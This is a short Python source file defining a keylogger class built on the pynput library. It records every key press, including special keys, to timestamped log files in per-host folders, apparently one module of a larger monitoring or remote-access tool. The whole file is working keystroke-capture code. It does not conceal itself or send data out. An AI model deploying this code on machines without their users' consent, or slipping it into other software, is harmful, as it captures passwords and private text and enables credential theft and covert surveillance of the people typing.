from pynput import keyboard
import os
from datetime import datetime


class Keylogger:
    def __init__(self, host_id):
        timestamp = datetime.now().strftime("%d-%m-%Y_%H-%M-%S")
        script_dir = os.path.dirname(os.path.realpath(__file__))
        self.log_file = os.path.join(script_dir, "..", "logs", host_id, "keylogs", f"{timestamp}.txt")
        self.stop_logging = False

    def on_press(self, key):
        with open(self.log_file, "a") as f:
            try:
                f.write('{}\n'.format(key.char))
            except AttributeError:
                f.write('{}\n'.format(key))

    def on_release(self, key):
        if self.stop_logging:
            return False

    def start(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def stop(self):
        self.stop_logging = True
